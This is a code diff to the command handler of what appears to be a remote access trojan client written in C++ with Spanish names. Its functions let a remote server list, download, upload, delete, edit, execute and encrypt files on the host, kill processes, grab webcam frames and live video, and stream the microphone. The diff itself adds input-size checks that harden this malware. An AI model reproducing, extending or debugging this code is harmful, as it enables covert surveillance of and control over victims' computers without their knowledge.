@@ -162,7 +162,7 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo_Init){
-        strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
+        strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
         if(strIn.size() == 3){
             DebugPrint("[!] Descargando archivo en ruta " + strIn[1] + " | size: " + strIn[2]);
             if((this->fpArchivo = fopen(strIn[1].c_str(), "wb")) == nullptr){
@@ -218,30 +218,34 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     //Lista directorio
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Dir_Folder){
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        std::string strPath = "";
-        if (strIn[1] == "DESCAR-DOWN") {
-            strPath = this->ObtenerDown();
-            std::string strPathBCDown = std::to_string(EnumComandos::FM_CPATH);
-            strPathBCDown.append(1, CMD_DEL);
-            strPathBCDown += strPath;
-            this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true);
-            Sleep(10);
-        } else if (strIn[1] == "ESCRI-DESK") {
-            strPath = this->ObtenerDesk();
-            std::string strPathBCDesk = std::to_string(EnumComandos::FM_CPATH);
-            strPathBCDesk.append(1, CMD_DEL);
-            strPathBCDesk += strPath;
-            this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true);
-            Sleep(10);
-        } else {
-            strPath = strIn[1];
-        }
-        for (auto item : vDir(strPath.c_str())) {
-            std::string strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
-            strCommand.append(1, CMD_DEL);
-            strCommand.append(item);
-            this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
-            Sleep(20);
+        if (strIn.size() == 2) {
+            std::string strPath = "";
+            if (strIn[1] == "DESCAR-DOWN") {
+                strPath = this->ObtenerDown();
+                std::string strPathBCDown = std::to_string(EnumComandos::FM_CPATH);
+                strPathBCDown.append(1, CMD_DEL);
+                strPathBCDown += strPath;
+                this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true);
+                Sleep(10);
+            }
+            else if (strIn[1] == "ESCRI-DESK") {
+                strPath = this->ObtenerDesk();
+                std::string strPathBCDesk = std::to_string(EnumComandos::FM_CPATH);
+                strPathBCDesk.append(1, CMD_DEL);
+                strPathBCDesk += strPath;
+                this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true);
+                Sleep(10);
+            }
+            else {
+                strPath = strIn[1];
+            }
+            for (auto item : vDir(strPath.c_str())) {
+                std::string strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
+                strCommand.append(1, CMD_DEL);
+                strCommand.append(item);
+                this->cSend(this->sckSocket, strCommand.c_str(), strCommand.size(), 0, true);
+                Sleep(30);
+            }
         }
         return;
     }
@@ -249,62 +253,79 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     //crear folder
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Folder) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        CrearFolder(strIn[1].c_str());
+        if (strIn.size() == 2) {
+            CrearFolder(strIn[1].c_str());
+        }
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crear_Archivo) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        CrearArchivo(strIn[1].c_str());
+        if (strIn.size() == 2) {
+            CrearArchivo(strIn[1].c_str());
+        }
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Borrar_Archivo) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        BorrarArchivo(strIn[1].c_str());
+        if (strIn.size() == 2) {
+            BorrarArchivo(strIn[1].c_str());
+        }
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Descargar_Archivo) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
-        std::string param1 = strIn[1];
-        std::string param2 = strIn[2];
-        std::thread th(&EnviarArchivo, param1, param2);
-        th.detach();
+        if (strIn.size() == 3) {
+            std::string param1 = strIn[1];
+            std::string param2 = strIn[2];
+            std::thread th(&EnviarArchivo, param1, param2);
+            th.detach();
+        }
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Ejecutar_Archivo){
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
-        bool isOK = Execute(strIn[1].c_str(), strIn[2] == "1" ? 1 : 0);
+        if (strIn.size() == 3) {
+            bool isOK = Execute(strIn[1].c_str(), strIn[2] == "1" ? 1 : 0);
 
-        if(isOK){
-            DebugPrint("[!] " + strIn[1] + " - ejecutado");
-        } else {
-            DebugPrint("[X] Error ejecutando " + strIn[1]);
+            if (isOK) {
+                DebugPrint("[!] " + strIn[1] + " - ejecutado");
+            }
+            else {
+                DebugPrint("[X] Error ejecutando " + strIn[1]);
+            }
         }
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Editar_Archivo){
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 3);
-        EditarArchivo(strIn[1], strIn[2]);
+        if (strIn.size() == 3) {
+            EditarArchivo(strIn[1], strIn[2]);
+        }
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Editar_Archivo_Guardar) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        int iHeader = strIn[0].size() + strIn[1].size() + 2;
-        char* cBytes = pBuffer + iHeader;
-        std::string strBuffer = std::string(cBytes);
+        if (strIn.size() == 2) {
+            int iHeader = strIn[0].size() + strIn[1].size() + 2;
+            char* cBytes = pBuffer + iHeader;
+            std::string strBuffer = std::string(cBytes);
 
-        EditarArchivo_Guardar(strIn[1], strBuffer.c_str(), static_cast<std::streamsize>(iSize) - iHeader);
+            EditarArchivo_Guardar(strIn[1], strBuffer.c_str(), static_cast<std::streamsize>(iSize) - iHeader);
+        }
         return;
     }
 
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Crypt_Archivo) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 4);
-        Crypt_Archivo(strIn[2], strIn[1][0], strIn[1][1], strIn[3]);
+        if (strIn.size() == 4) {
+            Crypt_Archivo(strIn[2], strIn[1][0], strIn[1][1], strIn[3]);
+        }
         return;
     }
     //#####################################################
@@ -324,10 +345,11 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::PM_Kill) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        if (!EndProcess(atoi(strIn[1].c_str()))) {
-            DebugPrint("[X] No se pudo terminar el PID " + strIn[1]);
+        if (strIn.size() == 2) {
+            if (!EndProcess(atoi(strIn[1].c_str()))) {
+                DebugPrint("[X] No se pudo terminar el PID " + strIn[1]);
+            }
         }
-
         return;
     }
 
@@ -378,100 +400,105 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
         } else {
             strPaquete += "Nica|Nica2 :v";
         }
-        DebugPrint(strPaquete);
         this->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, true);
-
         return;
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Single) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        if (!this->mod_Cam) {
-            this->mod_Cam = new mod_Camera();
-            this->mod_Cam->ListNameCaptureDevices();
-            if (this->mod_Cam->vcCamObjs.size() <= 0) {
-                DebugPrint("[X] No se obtuvieron camaras");
-                delete this->mod_Cam;
-                this->mod_Cam = nullptr;
-                return;
-            }
-        }
-
-        HRESULT hr = S_OK;
-        u_int iDeviceIndex = atoi(strIn[1].c_str());
-        
-        if (iDeviceIndex > this->mod_Cam->vcCamObjs.size()) {
-            iDeviceIndex = 0; //Si el numero enviado desde el sever es mayor setear a 0 como default
-        }
-
-        if (this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
-            return;
-        }
-
-        hr = this->mod_Cam->Init(this->mod_Cam->vcCamObjs[iDeviceIndex].sActivate, iDeviceIndex);
-        
-        if (SUCCEEDED(hr)) {
-            this->mod_Cam->vcCamObjs[iDeviceIndex].isActivated = true;
-
-            DebugPrint("[!] Camara iniciada correctamente");
-
-            std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
-            strHeader.append(1, CMD_DEL);
-            strHeader += strIn[1];
-            strHeader.append(1, CMD_DEL);
-
-            //Testing
-            int iBufferSize = 0;
-            int iHeaderSize = strHeader.size();
-            u_int iJPGBufferSize = 0;
-            u_int uiPacketSize = 0;
-            BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize, iDeviceIndex);
-            BYTE* cJPGBuffer = nullptr;
-            BYTE* cPacket = nullptr;
-
-            if (cBuffer) {
-                cJPGBuffer = this->mod_Cam->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
-                if (cJPGBuffer) {
-                    uiPacketSize = iHeaderSize + iJPGBufferSize;
-                    cPacket = new BYTE[uiPacketSize];
-                    if (cPacket) {
-                        memcpy(cPacket, strHeader.c_str(), iHeaderSize);
-                        memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
-
-                        int iSent = this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
-                        DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");
-
-                        delete[] cPacket;
-                        cPacket = nullptr;
-                    }
-                    delete[] cJPGBuffer;
-                    cJPGBuffer = nullptr;
+        if (strIn.size() == 2) {
+            if (!this->mod_Cam) {
+                this->mod_Cam = new mod_Camera();
+                this->mod_Cam->ListNameCaptureDevices();
+                if (this->mod_Cam->vcCamObjs.size() <= 0) {
+                    DebugPrint("[X] No se obtuvieron camaras");
+                    delete this->mod_Cam;
+                    this->mod_Cam = nullptr;
+                    return;
                 }
             }
 
-            if (cBuffer) {
-                delete[] cBuffer;
-                cBuffer = nullptr;
+            HRESULT hr = S_OK;
+            u_int iDeviceIndex = atoi(strIn[1].c_str());
+
+            if (iDeviceIndex > this->mod_Cam->vcCamObjs.size()) {
+                iDeviceIndex = 0; //Si el numero enviado desde el sever es mayor setear a 0 como default
             }
+
+            if (this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
+                return;
+            }
+
+            hr = this->mod_Cam->Init(this->mod_Cam->vcCamObjs[iDeviceIndex].sActivate, iDeviceIndex);
+
+            if (SUCCEEDED(hr)) {
+                this->mod_Cam->vcCamObjs[iDeviceIndex].isActivated = true;
+
+                DebugPrint("[!] Camara iniciada correctamente");
+
+                std::string strHeader = std::to_string(EnumComandos::CM_Single_Salida);
+                strHeader.append(1, CMD_DEL);
+                strHeader += strIn[1];
+                strHeader.append(1, CMD_DEL);
+
+                //Testing
+                int iBufferSize = 0;
+                int iHeaderSize = strHeader.size();
+                u_int iJPGBufferSize = 0;
+                u_int uiPacketSize = 0;
+                BYTE* cBuffer = this->mod_Cam->GetFrame(iBufferSize, iDeviceIndex);
+                BYTE* cJPGBuffer = nullptr;
+                BYTE* cPacket = nullptr;
+
+                if (cBuffer) {
+                    cJPGBuffer = this->mod_Cam->toJPEG(cBuffer, iBufferSize, iJPGBufferSize);
+                    if (cJPGBuffer) {
+                        uiPacketSize = iHeaderSize + iJPGBufferSize;
+                        cPacket = new BYTE[uiPacketSize];
+                        if (cPacket) {
+                            memcpy(cPacket, strHeader.c_str(), iHeaderSize);
+                            memcpy(cPacket + iHeaderSize, cJPGBuffer, iJPGBufferSize);
+
+                            int iSent = this->cSend(this->sckSocket, (const char*)cPacket, uiPacketSize, 0, true);
+                            DebugPrint("[!] " + std::to_string(iSent) + " bytes sent");
+
+                            delete[] cPacket;
+                            cPacket = nullptr;
+                        }
+                        delete[] cJPGBuffer;
+                        cJPGBuffer = nullptr;
+                    }
+                }
+
+                if (cBuffer) {
+                    delete[] cBuffer;
+                    cBuffer = nullptr;
+                }
+            }
+
+            this->mod_Cam->vcCamObjs[iDeviceIndex].ReleaseCam();
         }
-
-        this->mod_Cam->vcCamObjs[iDeviceIndex].ReleaseCam();
-
         return;
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Start) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        u_int iDeviceIndex = atoi(strIn[1].c_str());
-        if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
-            this->mod_Cam->SpawnLive(iDeviceIndex);
+        if (strIn.size() == 2) {
+            u_int iDeviceIndex = atoi(strIn[1].c_str());
+            if (!this->mod_Cam->vcCamObjs[iDeviceIndex].isLive) {
+                this->mod_Cam->SpawnLive(iDeviceIndex);
+            }
         }
+        return;
     }
 
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::CM_Live_Stop) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        u_int iDeviceIndex = atoi(strIn[1].c_str());
-        this->mod_Cam->JoinLiveThread(iDeviceIndex);
+        if (strIn.size() == 2) {
+            u_int iDeviceIndex = atoi(strIn[1].c_str());
+            this->mod_Cam->JoinLiveThread(iDeviceIndex);
+        }
+        return;
     }
     //#####################################################
 
@@ -493,12 +520,16 @@ void Cliente::ProcesarComando(char* pBuffer, int iSize) {
     //Escuchar mic en tiempo real
     if (this->Comandos[strIn[0].c_str()] == EnumComandos::Mic_Iniciar_Escucha) {
         strIn = strSplit(std::string(pBuffer), CMD_DEL, 2);
-        if (this->mod_Mic == nullptr) {
-            this->mod_Mic = new Mod_Mic(this);
+        if (strIn.size() == 2) {
+            if (this->mod_Mic == nullptr) {
+                this->mod_Mic = new Mod_Mic(this);
+            }
+            if (!this->mod_Mic->isLiveMic) {
+                this->mod_Mic->sckSocket = this->sckSocket;
+                this->mod_Mic->p_DeviceID = atoi(strIn[1].c_str());
+                this->mod_Mic->m_EmpezarLive();
+            }
         }
-        this->mod_Mic->sckSocket = this->sckSocket;
-        this->mod_Mic->p_DeviceID = atoi(strIn[1].c_str());
-        this->mod_Mic->m_EmpezarLive();
         return;
     }
 
